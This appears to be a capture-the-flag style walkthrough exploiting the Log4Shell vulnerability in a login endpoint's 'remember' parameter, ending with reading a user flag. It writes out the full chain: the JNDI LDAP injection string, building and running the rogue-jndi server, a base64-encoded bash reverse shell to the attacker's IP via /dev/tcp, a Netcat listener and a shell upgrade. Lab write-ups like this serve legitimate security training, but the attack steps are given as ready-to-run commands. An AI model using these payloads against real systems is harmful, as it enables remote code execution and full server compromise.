# Log4J Exploit

## <mark style="color:red;">Log4J vulnerability EXPLOIT</mark>

> This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection), which is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application and typically fully compromise the application and all its data.&#x20;

To determine if this is the case, we can use FoxyProxy after making a POST request to the /api/login

We have to input our payload into the **remember** parameter.

Because the POST data is being sent as a JSON object and because the payload contains brackets {} , in order to prevent it from being parsed as another JSON object we enclose it inside brackets " so that it is parsed as a string instead.

<figure><img src="../../.gitbook/assets/Screenshot from 2025-01-27 10-17-06.png" alt=""><figcaption></figcaption></figure>

We input the payload into the remember field as shown above so that we can identify an injection point if one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable. &#x20;

{% hint style="info" %}
<mark style="color:orange;">**JNDI**</mark> is the acronym for the **Java Naming and Directory Interface API** . By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.&#x20;

<mark style="color:orange;">**LDAP**</mark> is the acronym for **Lightweight Directory Access Protocol** , which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network.
{% endhint %}

The default port that LDAP runs on is port 389&#x20;

```
. ${jndi:ldap://{Tun0 IP Address}/whatever}
```

After we hit "send" the "Response" pane will display the response from the request. The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed.

We will use tcpdump on port 389 , which will monitor the network traffic for LDAP connections.&#x20;

```
sudo tcpdump -i tun0 port 389

--------------------------------------------------------------------------------
sudo: Run this via root also known as admin.

tcpdump: Is the program or software that is Wireshark except, it's a command line
version.

-i: Selecting interface. (Example eth0, wlan, tun0)
port 389: Selecting the port we are listening on.
```

{% hint style="warning" %}
tcpdump is a data-network packet analyzer computer program that runs under a command line interface. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. sudo tcpdump -i tun0 port 389 sudo: Run this via root also known as admin. tcpdump: Is the program or software that is Wireshark except, it's a command line version. -i: Selecting interface. (Example eth0, wlan, tun0) port 389: Selecting the port we are listening on.
{% endhint %}

* The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.

### <mark style="color:blue;">Payload</mark>

We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system

{% hint style="info" %}
Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into jar files .
{% endhint %}

These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.

```
sudo apt-get install maven
```

Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java application.

```sh
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar .&#x20;

Now we can construct our payload to pass into the RogueJndi-1-1.jar Java application.&#x20;

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.&#x20;

{% code overflow="wrap" fullWidth="true" %}
```sh
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64
```
{% endcode %}

After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the --command option and your tun0 IP address to the --hostname option.&#x20;

For example:&#x20;

{% code fullWidth="true" %}
```sh
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|
{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}
```
{% endcode %}

Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to capture the reverse shell.&#x20;

```
nc -lvp 4444
```

Going back to our intercepted POST request, let's change the payload to

```sh
 ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} and click Send
```

After sending the request, a connection to our rogue server is received and the following message is shown.&#x20;

```
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can upgrade the terminal shell using the following command.&#x20;

```
script /dev/null -c bash
```

The above command will turn our shell into an interactive shell that will allow us to interact with the system more effectively. From here we can navigate to /home/Michael/ and read the user flag.&#x20;

***
